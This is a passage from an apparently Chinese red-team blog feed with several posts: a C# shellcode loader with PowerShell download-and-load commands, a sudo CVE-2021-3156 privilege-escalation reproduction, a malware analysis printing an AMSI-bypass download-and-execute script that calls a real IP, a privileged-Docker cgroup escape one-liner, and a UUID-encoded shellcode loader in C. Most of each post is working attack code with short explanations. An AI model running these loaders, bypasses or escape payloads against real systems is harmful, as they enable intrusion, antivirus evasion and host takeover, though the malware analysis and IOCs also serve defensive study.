0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,                                    0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,                                    0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,                                    0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,                                    0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,                                    0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB                                };            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            UInt32 threadId = 0;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }        static void Main(string[] args)        {            // native function’s compiled code            // generated with metasploit        }        private static UInt32 MEM_COMMIT = 0x1000;        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);        [DllImport(&quot;kernel32&quot;)]        private static extern bool VirtualFree(IntPtr lpAddress,        UInt32 dwSize, UInt32 dwFreeType);        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr CreateThread(        UInt32 lpThreadAttributes,        UInt32 dwStackSize,        UInt32 lpStartAddress,        IntPtr param,        UInt32 dwCreationFlags,        ref UInt32 lpThreadId        );        [DllImport(&quot;kernel32&quot;)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 WaitForSingleObject(        IntPtr hHandle,        UInt32 dwMilliseconds        );        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr GetModuleHandle(        string moduleName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetProcAddress(        IntPtr hModule,        string procName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 LoadLibrary(        string lpFileName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetLastError();    }}</code></pre><p>利用csc生成或者vs生成 (这里csc生成对应的位数须为x86)</p><pre><code>csc.exe /unsafe /platform:x86 /out:output\run.exe output\tmp.cs</code></pre><p>基本调用</p><pre><code class="powershell">$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)[Reflection.Assembly]::Load($bytes)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVaJoT.png" alt=""></p><p>下载并执行<br>远端的payload.txt</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)$a=[Convert]::ToBase64String($bytes)$a | out-file &quot;payload.txt&quot;</code></pre><p>远程调用</p><pre><code>$payload=(New-Object Net.WebClient).DownloadString(&quot;URL&quot;)$tk=[Convert]::FromBase64String($payload)[Reflection.Assembly]::Load($tk)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVa0yR.png" alt=""></p><p>写了个脚本用于快速生成对应的powershell command<br><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2021-3156 sudo提权漏洞复现</title>
      <link href="/posts/14fbb503.html"/>
      <url>/posts/14fbb503.html</url>
      <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1</p><p>sudo官方位于1月26号已经修复，后面在安装的sudo已经补上了<br><img src="https://s3.ax1x.com/2021/01/31/yErSN6.png" alt=""><br>官方链接：<a href="https://www.sudo.ws/" target="_blank" rel="noopener">https://www.sudo.ws/</a></p><p><strong>不影响的版本</strong><br>sudo =&gt;1.9.5p2</p><p>exp：<a href="https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156</a><br>来源于某微信公众号:<a href="https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Debain Sudo version 1.8.31p1<br>Ubuntu Sudo version 1.8.21p2 （昨天安的sudo已经修复）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>检测是否存在漏洞</p><pre><code>sudoedit -s /</code></pre><p>存在<br><img src="https://s3.ax1x.com/2021/01/31/yErYEq.png" alt=""></p><p>不存在<br><img src="https://s3.ax1x.com/2021/01/31/yErg56.png" alt=""></p><p>下载exp，make。然后运行sudo-hax-me-a-sandwich<br><img src="https://s3.ax1x.com/2021/01/31/yErhxe.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yErbIP.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某word恶意VBA样本分析</title>
      <link href="/posts/e2324e90.html"/>
      <url>/posts/e2324e90.html</url>
      <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815684465&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到的一个样本。打算分析一下<br>样本来源:<a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a></p><p>最后修改：2021/2/1</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>winhex打开文档发现是rtf文件<br><img src="https://s3.ax1x.com/2021/02/01/yZAnpQ.png" alt=""></p><p>利用oletools套件里的rtfobj查看<br><img src="https://s3.ax1x.com/2021/02/01/yZAsAK.png" alt=""></p><p>dump出vbs</p><pre><code>rtfobj -s all invoice.doc</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yZALcj.png" alt=""></p><p>Client.vbs：<a href="https://paste.ubuntu.com/p/v74cHNShTq/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/v74cHNShTq/</a><br>由于给出的比较混乱加上app.any.run给出的执行过程，大概一句话:<br>根据判断使用wscript或powershell执行上线</p><p>powershell command分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39; + &#39;stem.&#39; + &#39;Mana&#39; + &#39;gem&#39; + &#39;ent&#39; + &#39;.Autom&#39; + &#39;atio&#39; + &#39;n.A&#39; + &#39;m&#39; + &#39;si&#39; + &#39;Utils&#39;);\n$835FFE1926 = &#39;4456625220575263174452554847&#39;;\n$9FE0AD5C66 = [string](0..13|% {    [char][int](53 + ($835FFE1926).substring(($_ * 2), 2))}) - replace &#39; &#39;;$58FB808063 = $8B0111F552.GetField($9FE0AD5C66, &#39;Non^^^&#39;.replace(&#39;^^^&#39;, &#39;Pub&#39;) + &#39;lic,S&#39; + &#39;tatic&#39;);$58FB808063.SetValue($null, $true);($A72F9B815A = $A72F9B815A = Write - Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);$747586859599494838475575854949393847584855 = @(91, 82, 101, 102, 93, 46, 65, 115, 115, 101, 109, 98, 108, 121, 46, 71, 101, 116, 84, 121, 112, 101, 40, 39, 83, 121, 39, 43, 39, 115, 116, 101, 109, 46, 39, 43, 39, 77, 97, 110, 97, 39, 43, 39, 103, 101, 109, 39, 43, 39, 101, 110, 116, 39, 43, 39, 46, 65, 117, 116, 111, 109, 39, 43, 39, 97, 116, 105, 111, 39, 43, 39, 110, 46, 39, 43, 36, 40, 91, 67, 72, 65, 114, 93, 40, 57, 56, 45, 51, 51, 41, 43, 91, 99, 72, 65, 114, 93, 40, 49, 50, 52, 45, 49, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 49, 49, 53, 41, 43, 91, 67, 72, 97, 82, 93, 40, 91, 66, 89, 116, 101, 93, 48, 120, 54, 57, 41, 41, 43, 39, 85, 116, 105, 108, 115, 39, 41, 46, 71, 101, 116, 70, 105, 101, 108, 100, 40, 36, 40, 91, 67, 104, 65, 114, 93, 40, 91, 98, 121, 116, 101, 93, 48, 120, 54, 49, 41, 43, 91, 99, 104, 97, 82, 93, 40, 91, 98, 89, 116, 69, 93, 48, 120, 54, 68, 41, 43, 91, 99, 104, 97, 114, 93, 40, 91, 98, 121, 84, 101, 93, 48, 120, 55, 51, 41, 43, 91, 99, 104, 65, 114, 93, 40, 49, 49, 48, 45, 53, 41, 43, 91, 99, 104, 65, 82, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 57, 41, 43, 91, 99, 72, 97, 82, 93, 40, 57, 54, 56, 48, 47, 56, 56, 41, 43, 91, 99, 72, 97, 82, 93, 40, 49, 48, 53, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 98, 89, 116, 101, 93, 48, 120, 55, 52, 41, 43, 91, 67, 104, 97, 114, 93, 40, 91, 66, 89, 84, 69, 93, 48, 120, 52, 54, 41, 43, 91, 99, 104, 97, 114, 93, 40, 49, 52, 56, 45, 53, 49, 41, 43, 91, 99, 72, 65, 82, 93, 40, 57, 53, 53, 53, 47, 57, 49, 41, 43, 91, 67, 104, 65, 82, 93, 40, 49, 48, 56, 41, 43, 91, 67, 104, 65, 114, 93, 40, 54, 50, 54, 50, 47, 54, 50, 41, 43, 91, 67, 104, 65, 82, 93, 40, 91, 98, 89, 84, 69, 93, 48, 120, 54, 52, 41, 41, 44, 39, 78, 111, 110, 80, 117, 98, 108, 105, 99, 44, 83, 116, 97, 116, 105, 99, 39, 41, 46, 83, 101, 116, 86, 97, 108, 117, 101, 40, 36, 110, 117, 108, 108, 44, 36, 116, 114, 117, 101, 41, 59, 40, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 36, 49, 68, 55, 56, 53, 70, 50, 56, 53, 67, 61, 87, 114, 105, 116, 101, 45, 72, 111, 115, 116, 32, 39, 69, 67, 52, 65, 65, 66, 53, 56, 48, 56, 50, 50, 51, 69, 66, 55, 50, 50, 70, 57, 67, 50, 48, 54, 51, 69, 68, 48, 53, 54, 54, 54, 53, 65, 65, 56, 48, 65, 67, 53, 54, 53, 56, 70, 57, 68, 48, 54, 56, 49, 53, 55, 50, 48, 55, 53, 57, 67, 51, 69, 66, 52, 67, 52, 66, 55, 48, 54, 53, 55, 50, 52, 67, 51, 68, 69, 70, 65, 54, 51, 68, 69, 66, 53, 56, 70, 67, 51, 70, 65, 57, 68, 50, 50, 49, 50, 49, 54, 55, 52, 39, 41, 59, 100, 111, 32, 123, 36, 112, 105, 110, 103, 32, 61, 32, 116, 101, 115, 116, 45, 99, 111, 110, 110, 101, 99, 116, 105, 111, 110, 32, 45, 99, 111, 109, 112, 32, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 32, 45, 99, 111, 117, 110, 116, 32, 49, 32, 45, 81, 117, 105, 101, 116, 125, 32, 117, 110, 116, 105, 108, 32, 40, 36, 112, 105, 110, 103, 41, 59, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 32, 61, 32, 91, 69, 110, 117, 109, 93, 58, 58, 84, 111, 79, 98, 106, 101, 99, 116, 40, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 84, 121, 112, 101, 93, 44, 32, 51, 48, 55, 50, 41, 59, 91, 83, 121, 115, 116, 101, 109, 46, 78, 101, 116, 46, 83, 101, 114, 118, 105, 99, 101, 80, 111, 105, 110, 116, 77, 97, 110, 97, 103, 101, 114, 93, 58, 58, 83, 101, 99, 117, 114, 105, 116, 121, 80, 114, 111, 116, 111, 99, 111, 108, 32, 61, 32, 36, 66, 54, 55, 54, 56, 48, 65, 69, 49, 54, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 61, 32, 78, 101, 119, 45, 79, 98, 106, 101, 99, 116, 32, 45, 67, 111, 109, 32, 77, 105, 99, 114, 111, 115, 111, 102, 116, 46, 88, 77, 76, 72, 84, 84, 80, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 49, 48, 56, 46, 54, 49, 46, 49, 54, 54, 46, 49, 49, 47, 109, 47, 102, 105, 110, 101, 46, 106, 112, 103, 39, 44, 36, 102, 97, 108, 115, 101, 41, 59, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 115, 101, 110, 100, 40, 41, 59, 36, 54, 55, 52, 69, 49, 54, 53, 67, 56, 51, 61, 91, 84, 101, 120, 116, 46, 69, 110, 99, 111, 100, 105, 110, 103, 93, 58, 58, 39, 85, 84, 70, 56, 39, 46, 39, 71, 101, 116, 83, 116, 114, 105, 110, 103, 39, 40, 91, 67, 111, 110, 118, 101, 114, 116, 93, 58, 58, 39, 70, 114, 111, 109, 66, 97, 115, 101, 54, 52, 83, 116, 114, 105, 110, 103, 39, 40, 36, 69, 55, 68, 69, 65, 56, 68, 66, 48, 51, 46, 114, 101, 115, 112, 111, 110, 115, 101, 84, 101, 120, 116, 41, 41, 124, 73, 96, 69, 96, 88);[System.Text.Encoding]::ASCII.GetString($747586859599494838475575854949393847584855)|I`E`X</code></pre><p>1.首先利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将ascii解码利用IEX执行</p><p>去混淆分析</p><pre><code class="powershell">[Ref].Assembly.GetType(&#39;Sy&#39;+&#39;stem.&#39;+&#39;Mana&#39;+&#39;gem&#39;+&#39;ent&#39;+&#39;.Autom&#39;+&#39;atio&#39;+&#39;n.&#39;+$([CHAr](98-33)+[cHAr](124-15)+[chAR](115)+[CHaR]([BYte]0x69))+&#39;Utils&#39;).GetField($([ChAr]([byte]0x61)+[chaR]([bYtE]0x6D)+[char]([byTe]0x73)+[chAr](110-5)+[chAR]([BYTE]0x49)+[cHaR](9680/88)+[cHaR](105)+[Char]([bYte]0x74)+[Char]([BYTE]0x46)+[char](148-51)+[cHAR](9555/91)+[ChAR](108)+[ChAr](6262/62)+[ChAR]([bYTE]0x64)),&#39;NonPublic,Static&#39;).SetValue($null,$true);($1D785F285C=$1D785F285C=Write-Host &#39;EC4AAB5808223EB722F9C2063ED056665AA80AC5658F9D06815720759C3EB4C4B7065724C3DEFA63DEB58FC3FA9D22121674&#39;);do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping); #判断google能否ping通$B67680AE16 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $B67680AE16;$E7DEA8DB03= New-Object -Com Microsoft.XMLHTTP;$E7DEA8DB03.open(&#39;GET&#39;,&#39;http://108.61.166.11/m/fine.jpg&#39;,$false);$E7DEA8DB03.send();$674E165C83=[Text.Encoding]::&#39;UTF8&#39;.&#39;GetString&#39;([Convert]::&#39;FromBase64String&#39;($E7DEA8DB03.responseText))|I`E`X #远程下载执行</code></pre><p>1.利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.发一个包检测能否连接google.com,如果不成功则重复检测<br>3.远程下载<code>http://108.61.166.11/m/fine.jpg</code> base64解码运行</p><p>fine.jpg<br><img src="https://s3.ax1x.com/2021/01/31/yA8V41.png" alt=""></p><p>经过base64解码得到一下code<br><img src="https://s3.ax1x.com/2021/01/31/yA8YCt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yA8wDg.png" alt=""><br>1.一如既往的利用System.Management.Automation.AmsiUtils状态，将检测的语句设置为null。bypass AMI<br>2.将@00替换为0x<br>3.利用[System.Reflection.Assembly]::Load加载带有基于通用对象文件格式 (COFF) 的映像的程序集，该映像包含已发出的程序集。 此程序集将会加载到调用方的应用程序域中。<br>4.利用Assembly.Load加载IMAGE_NT_HEADERS变量里的dll，然后调用Quoting类里的SplitUnquoted函数将$ZOIOXMAUI??KDWXAMKYEC参数传入</p><p>提取出来的dll如下<br><img src="https://s3.ax1x.com/2021/01/31/yEYIk4.md.png" alt=""></p><p>根据app.any.run给出的标签属于trojan家族的</p><p>Quoting类里的SplitUnquoted函数<br><img src="https://s3.ax1x.com/2021/01/31/yEaSNF.png" alt=""></p><p>最后所有提取出来的文件<br><img src="https://s3.ax1x.com/2021/02/01/yZEpNT.png" alt=""></p><p>IOCS:<br>Main object- “mal0129-01.zip”<br>    sha256    00789a46bbe5d6537f0b2ebb23a006d51c18752f13c1fac475f39b7e8e0431a4<br>    sha1    3e70416110eca3a4dda6a28e929413193fa008b4<br>    md5    e26e82db7083a2559ecfe147c7696cb9<br>Connections<br>    ip    108.61.166.11<br>HTTP/HTTPS requests<br>    url    <a href="http://108.61.166.11/m/fine.jpg" target="_blank" rel="noopener">http://108.61.166.11/m/fine.jpg</a>    </p><p>微步社区<br><img src="https://s3.ax1x.com/2021/01/31/yAGdRx.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#" target="_blank" rel="noopener">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/#</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.load?view=net-5.0</a><br><a href="https://blog.csdn.net/csdndscs/article/details/103946972" target="_blank" rel="noopener">https://blog.csdn.net/csdndscs/article/details/103946972</a><br><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用cgroup快速逃逸docker</title>
      <link href="/posts/99258750.html"/>
      <url>/posts/99258750.html</url>
      <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1461215205&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在群里看见篇docker逃逸的文章，看到个没见到的操作。复现并记录一波</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>容器拥有特权模式<br>docker run -it –privileged ubuntu /bin/bash</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>payload</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_releaset=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`touch /o; echo $t/c &gt;$d/release_agent;printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3OM9.png" alt=""></p><p>命令刨析</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` #寻找cgroup文件夹位置mkdir -p $d/wecho 1 &gt;$d/w/notify_on_release #该文件的内容为1时，当cgroup退出时（不再包含任何进程和子cgroup），将调用release_agent里面配置的命令。新cgroup被创建时将默认继承父cgroup的这项配置。t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` #从当前的分区挂载寻找该容器的UIDtouch /oecho $t/c &gt; $d/release_agent #里面包含了cgroup退出时将会执行的命令，系统调用该命令时会将相应cgroup的相对路径当作参数传进去。printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c; #输出&lt;command&gt; \&gt; 和容器pid路径 图二 (将在母机上执行的命令执行到容器根目录里面的o文件)chmod +x /csh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot; #当前cgroup中的所有进程ID，系统不保证ID是顺序排列的，且ID有可能重复 （将进程PID写入除非cgroup执行）sleep 1cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3jq1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3xVx.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3za6.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当docker容器使用特权模式启动时，有权操控cgroup，由于cgroup是Linux内核的一个功能。利用cgroup可以直接执行母机的命令 （说法可能有误）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/" target="_blank" rel="noopener">https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F" target="_blank" rel="noopener">https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F</a><br><a href="https://zh.wikipedia.org/wiki/Cgroups" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cgroups</a></p>]]></content>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>UID shellcode硬编码</title>
      <link href="/posts/9f6e42ac.html"/>
      <url>/posts/9f6e42ac.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的<br>原文链接：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>原文给出的shellcode如下</p><pre><code>1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></pre><p>shellcode转换成UUID后和原文是对的上的</p><pre><code class="py">import uuidimport binasciiimport chardetbuf=b&quot;1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;hex_buf=binascii.hexlify(buf).decode()tmp=&quot;&quot;for k in hex_buf:    tmp+=k    if len(tmp)==32:        print(&quot;\&quot;{}\&quot;,&quot;.format(uuid.UUID(bytes_le=binascii.unhexlify(tmp))))        tmp=&quot;&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLP7Ct.png" alt=""></p><p>执行shellcode</p><pre><code class="C">// uuidrun.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={    &quot;6850c031-6163-636c-5459-504092741551&quot;,    &quot;2f728b64-768b-8b0c-760c-ad8b308b7e18&quot;,    &quot;1aeb50b2-60b2-2948-d465-488b32488b76&quot;,    &quot;768b4818-4810-48ad-8b30-488b7e300357&quot;,    &quot;175c8b3c-8b28-1f74-2048-01fe8b541f24&quot;,    &quot;172cb70f-528d-ad02-813c-0757696e4575&quot;,    &quot;1f748bef-481c-fe01-8b34-ae4801f799ff&quot;,    &quot;000000d7-0000-0000-0000-000000000000&quot;,};int main(){    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //在进程的虚拟地址空间中保留空间    void* ha = HeapAlloc(hc, 0, 0x100000); //申请内存    DWORD_PTR hptr = (DWORD_PTR)ha;    int elems = sizeof(uuids) / sizeof(uuids[0]);    for (int i = 0; i &lt; elems; i++) {        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr); //UUID转换为原来的shellcode写入内存        if (status != RPC_S_OK) {            printf(&quot;UuidFromStringA() != S_OK\n&quot;);            CloseHandle(ha);            return -1;        }        hptr += 16;    }    printf(&quot;[*] Hexdump: &quot;);    for (int i = 0; i &lt; elems * 16; i++) {        printf(&quot;%02X &quot;, ((unsigned char*)ha)[i]);    }    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //枚举操作系统上安装或支持的语言环境。    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/01/25/sLPqv8.png" alt=""></p><p>原文的shellcode反汇编后如下</p><pre><code class="asm">xor eax, eax ;清空eaxpush raxpush 0x636c6163 ;calcpush rsppop rcxpush raxxchg eax, edx ;交换edx和eax的值，EAX=EDX,EDX=EAXje 0x24push rcxmov esi, dword ptr fs:[rdx + 0x2f] ;寻找PEB地址mov esi, dword ptr [rsi + 0xc]mov esi, dword ptr [rsi + 0xc]lodsd eax, dword ptr [rsi]mov esi, dword ptr [rax]mov edi, dword ptr [rsi + 0x18]mov dl, 0x50jmp 0x3emov dl, 0x60sub rsp, rdxmov rsi, qword ptr gs:[rdx] ;寻找PEB地址mov rsi, qword ptr [rsi + 0x18]mov rsi, qword ptr [rsi + 0x10]lodsq rax, qword ptr [rsi]mov rsi, qword ptr [rax]mov rdi, qword ptr [rsi + 0x30]add edx, dword ptr [rdi + 0x3c]mov ebx, dword ptr [rdi + rdx + 0x28]mov esi, dword ptr [rdi + rbx + 0x20]add rsi, rdimov edx, dword ptr [rdi + rbx + 0x24]movzx ebp, word ptr [rdi + rdx]lea edx, [rdx + 2]lodsd eax, dword ptr [rsi]cmp dword ptr [rdi + rax], 0x456e6957jne 0x50mov esi, dword ptr [rdi + rbx + 0x1c]add rsi, rdimov esi, dword ptr [rsi + rbp*4]add rdi, rsicdq call rdiadd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], al</code></pre><p>尝试用msf的shellcode来整UUID。发现并不行，估计shellcode需要修改，不会改，算篇复现文…</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>regsvr32绕过</title>
      <link href="/posts/b2680e3b.html"/>
      <url>/posts/b2680e3b.html</url>
